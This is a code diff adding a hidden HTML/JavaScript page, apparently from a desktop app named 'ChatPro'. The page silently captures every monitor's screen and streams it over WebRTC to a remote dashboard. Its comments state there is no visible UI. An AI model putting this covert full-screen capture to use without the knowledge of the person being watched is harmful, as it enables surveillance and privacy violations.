@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
+<title>ChatPro live capture</title>
+<style>
+/* Verstecktes Fenster, keine sichtbare UI. Status nur für Debugging im DOM. */
+html,body { margin:0; padding:0; background:#000; }
+#status { display:none; }
+</style>
+</head>
+<body>
+<div id="status"></div>
+<script>
+(function () {
+  var live = window.live;
+  var pc = null;
+  var gen = 0;               // Generationszähler gegen Start/Stop-Rennen
+  var capturedStreams = [];  // alle erfassten Streams, damit cleanup sie sicher stoppt
+  var pendingCandidates = [];
+  var remoteSet = false;
+
+  function setStatus(text) {
+    var el = document.getElementById('status');
+    if (el) el.textContent = text;
+  }
+
+  function stopStream(stream) {
+    try {
+      stream.getTracks().forEach(function (t) { try { t.stop(); } catch (e) {} });
+    } catch (e) {}
+  }
+
+  function cleanupPc() {
+    if (pc) {
+      try {
+        pc.getSenders().forEach(function (sender) {
+          try {
+            if (sender.track) sender.track.stop();
+          } catch (e) {}
+        });
+      } catch (e) {}
+      try { pc.close(); } catch (e) {}
+    }
+    // Auch Streams stoppen, die erfasst, aber noch nicht hinzugefügt wurden.
+    capturedStreams.forEach(stopStream);
+    capturedStreams = [];
+    pc = null;
+    remoteSet = false;
+    pendingCandidates = [];
+  }
+
+  async function startCapture(payload) {
+    try {
+      // Vorherige Verbindung erst säubern, falls ein zweites onStart kommt.
+      cleanupPc();
+      var myGen = ++gen;
+
+      var sourceIds = (payload && payload.sourceIds) || [];
+      var iceServers = (payload && payload.iceServers) || [];
+
+      var myPc = new RTCPeerConnection({ iceServers: iceServers });
+      pc = myPc;
+
+      myPc.onicecandidate = function (e) {
+        try {
+          if (e.candidate) {
+            live.sendCandidate(e.candidate.toJSON ? e.candidate.toJSON() : e.candidate);
+          }
+        } catch (err) {}
+      };
+
+      var added = 0;
+
+      // Jeder Monitor wird einzeln erfasst und als eigener Track hinzugefügt.
+      for (var i = 0; i < sourceIds.length; i++) {
+        var sourceId = sourceIds[i];
+        var stream = null;
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({
+            audio: false,
+            video: {
+              mandatory: {
+                chromeMediaSource: 'desktop',
+                chromeMediaSourceId: sourceId
+              }
+            }
+          });
+
+          // Stop oder Neustart während des Wartens: Stream sofort freigeben und abbrechen.
+          if (gen !== myGen) {
+            stopStream(stream);
+            return;
+          }
+          capturedStreams.push(stream);
+
+          var tracks = stream.getVideoTracks();
+          for (var t = 0; t < tracks.length; t++) {
+            myPc.addTrack(tracks[t], stream);
+            added++;
+          }
+        } catch (captureErr) {
+          // Fehlgeschlagener Capture (z.B. fehlende macOS-Bildschirmaufnahme-Berechtigung)
+          // blockiert die anderen Monitore nicht; ein halb hinzugefügter Stream wird freigegeben.
+          if (stream) stopStream(stream);
+          setStatus('capture failed for ' + sourceId);
+        }
+        if (gen !== myGen) return;
+      }
+
+      // Ohne Track keine leere Session bilden, das Dashboard läuft dann einfach in den Timeout.
+      if (added === 0) {
+        setStatus('error: no capture track, offer skipped');
+        cleanupPc();
+        return;
+      }
+
+      var offer = await myPc.createOffer();
+      if (gen !== myGen) return;
+      await myPc.setLocalDescription(offer);
+      if (gen !== myGen) return;
+
+      live.sendOffer({ sdp: myPc.localDescription.sdp, candidates: [] });
+      setStatus('offer sent');
+    } catch (err) {
+      setStatus('start failed');
+    }
+  }
+
+  async function applyRemote(payload) {
+    try {
+      if (!pc) return;
+      var answer = payload && payload.answer;
+      var candidates = (payload && payload.candidates) || [];
+
+      if (answer) {
+        await pc.setRemoteDescription(new RTCSessionDescription({ type: 'answer', sdp: answer }));
+        remoteSet = true;
+      }
+
+      // Erst die gepufferten, dann die neu mitgelieferten Kandidaten anwenden.
+      var toApply = pendingCandidates.concat(candidates);
+      pendingCandidates = [];
+
+      for (var i = 0; i < toApply.length; i++) {
+        if (!remoteSet) {
+          pendingCandidates.push(toApply[i]);
+          continue;
+        }
+        try {
+          await pc.addIceCandidate(new RTCIceCandidate(toApply[i]));
+        } catch (candErr) {
+          // Einzelner Kandidat darf die Verbindung nicht abbrechen.
+        }
+      }
+
+      setStatus('remote applied');
+    } catch (err) {
+      setStatus('remote failed');
+    }
+  }
+
+  function stopCapture() {
+    try {
+      gen++; // laufende startCapture-Aufrufe ungültig machen
+      cleanupPc();
+      setStatus('stopped');
+    } catch (err) {}
+  }
+
+  try {
+    live.onStart(function (payload) { startCapture(payload); });
+    live.onRemote(function (payload) { applyRemote(payload); });
+    live.onStop(function () { stopCapture(); });
+  } catch (err) {}
+})();
+</script>
+</body>
+</html>
